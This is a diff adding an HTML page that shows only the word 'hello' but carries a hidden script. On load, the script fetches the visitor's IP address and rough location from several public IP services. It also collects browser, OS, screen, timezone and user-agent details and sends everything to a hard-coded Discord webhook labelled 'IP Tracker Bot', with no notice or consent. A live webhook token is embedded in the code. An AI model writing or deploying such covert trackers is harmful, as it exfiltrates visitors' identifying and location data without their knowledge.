@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hello</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background: #ffffff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
+        .message {
+            font-size: 48px;
+            color: #333;
+            text-align: center;
+            animation: fadeIn 1s ease-in;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="message">hello</div>
+
+    <script>
+        // Discord Webhook URL
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1446831459024240694/xhfxSUVoAhaD0Eysu150mnqY7dLz7Qfpulu6dOkm4KotxZ6xXD3LKLn3U47k6pbOGcEV';
+
+        // Function to detect browser
+        function detectBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('chrome') && !userAgent.includes('edg')) return 'Chrome';
+            if (userAgent.includes('firefox')) return 'Firefox';
+            if (userAgent.includes('safari') && !userAgent.includes('chrome')) return 'Safari';
+            if (userAgent.includes('edg')) return 'Edge';
+            if (userAgent.includes('opera') || userAgent.includes('opr')) return 'Opera';
+            return 'Unknown';
+        }
+
+        // Function to detect OS
+        function detectOS() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            if (userAgent.includes('windows')) return 'Windows';
+            if (userAgent.includes('mac')) return 'macOS';
+            if (userAgent.includes('linux')) return 'Linux';
+            if (userAgent.includes('android')) return 'Android';
+            if (userAgent.includes('iphone') || userAgent.includes('ipad')) return 'iOS';
+            return 'Unknown';
+        }
+
+        // Function to get additional info
+        function getDeviceInfo() {
+            return {
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                viewport: `${window.innerWidth}x${window.innerHeight}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'Not set',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                localTime: new Date().toLocaleString()
+            };
+        }
+
+        // Function to send data to Discord
+        async function sendToDiscord(ipData) {
+            const now = new Date();
+            const deviceInfo = getDeviceInfo();
+            const browser = detectBrowser();
+            const os = detectOS();
+
+            // Create Discord embed with cleaner formatting
+            const locationStr = ipData.city && ipData.city !== 'Unknown'
+                ? `${ipData.city}, ${ipData.region}, ${ipData.country}`
+                : 'Location unavailable';
+
+            const ispStr = ipData.org && ipData.org !== 'Unknown' ? ipData.org : 'ISP unavailable';
+
+            const embed = {
+                title: "New Visitor",
+                color: 0x2B2D31,  // Dark grey
+                fields: [
+                    {
+                        name: "IP Address",
+                        value: `\`\`\`${ipData.ip}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "Timestamp",
+                        value: `<t:${Math.floor(now.getTime() / 1000)}:F>`,
+                        inline: false
+                    },
+                    {
+                        name: "System",
+                        value: `> **Browser:** ${browser}\n> **OS:** ${os}\n> **Language:** ${deviceInfo.language}\n> **Timezone:** ${deviceInfo.timezone}`,
+                        inline: false
+                    },
+                    {
+                        name: "Display",
+                        value: `> **Screen:** ${deviceInfo.screenResolution}\n> **Viewport:** ${deviceInfo.viewport}`,
+                        inline: false
+                    },
+                    {
+                        name: "Network",
+                        value: `> **Location:** ${locationStr}\n> **ISP:** ${ispStr}`,
+                        inline: false
+                    },
+                    {
+                        name: "User Agent",
+                        value: `\`\`\`${navigator.userAgent.substring(0, 1000)}\`\`\``,
+                        inline: false
+                    }
+                ]
+            };
+
+            // Prepare webhook payload with IP in both message and embed
+            const payload = {
+                content: ipData.ip,
+                embeds: [embed],
+                username: "IP Tracker Bot"
+            };
+
+            try {
+                // Send to Discord webhook
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    console.log('Successfully sent to Discord');
+                } else {
+                    console.error('Failed to send to Discord:', response.status);
+                }
+            } catch (error) {
+                console.error('Error sending to Discord:', error);
+            }
+        }
+
+        // Function to get visitor IP and info
+        async function getVisitorInfo() {
+            // Try multiple IP services in order - IPv4 specific endpoints
+            const ipServices = [
+                'https://api.ipify.org?format=json',  // Returns IPv4 by default
+                'https://api.my-ip.io/v1/ip',  // IPv4 endpoint
+                'https://ipv4.icanhazip.com',  // IPv4 only
+                'https://api.ipify.org',  // Plain text IPv4
+                'https://ipapi.co/json/',
+                'https://ipinfo.io/json'
+            ];
+
+            let ipData = null;
+            let ipv4 = null;
+
+            // Try each service until we get IPv4
+            for (const service of ipServices) {
+                try {
+                    const response = await fetch(service, {
+                        method: 'GET',
+                        cache: 'no-cache'
+                    });
+
+                    let data;
+                    const contentType = response.headers.get('content-type');
+
+                    // Handle both JSON and plain text responses
+                    if (contentType && contentType.includes('application/json')) {
+                        data = await response.json();
+                        ipv4 = data.ip || data.ip_addr || data.IPv4;
+                    } else {
+                        // Plain text response
+                        ipv4 = (await response.text()).trim();
+                    }
+
+                    // Verify it's IPv4 (not IPv6)
+                    if (ipv4 && !ipv4.includes(':') && ipv4.match(/^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$/)) {
+                        // Valid IPv4 format
+                        ipData = {
+                            ip: ipv4,
+                            city: data?.city || 'Unknown',
+                            region: data?.region || data?.region_name || 'Unknown',
+                            country: data?.country || data?.country_name || data?.country_code || 'Unknown',
+                            org: data?.org || data?.isp || data?.as || 'Unknown'
+                        };
+
+                        console.log('Successfully retrieved IPv4 from:', service);
+                        break; // Success, exit loop
+                    } else {
+                        console.log(`Got IPv6 or invalid format from ${service}, trying next...`);
+                        continue;
+                    }
+                } catch (error) {
+                    console.log(`Service ${service} failed:`, error.message);
+                    continue; // Try next service
+                }
+            }
+
+            // If all services failed (tracking protection), send without IP
+            if (!ipData) {
+                console.warn('All IP services blocked by browser tracking prevention');
+                ipData = {
+                    ip: 'Blocked by Tracking Prevention - Check Discord webhook logs for actual IP',
+                    city: 'Unknown',
+                    region: 'Unknown',
+                    country: 'Unknown',
+                    org: 'Unknown'
+                };
+            }
+
+            // Send to Discord regardless
+            await sendToDiscord(ipData);
+        }
+
+        // Run on page load
+        window.addEventListener('load', function() {
+            // Small delay to ensure page is fully loaded
+            setTimeout(getVisitorInfo, 500);
+        });
+    </script>
+</body>
+</html>
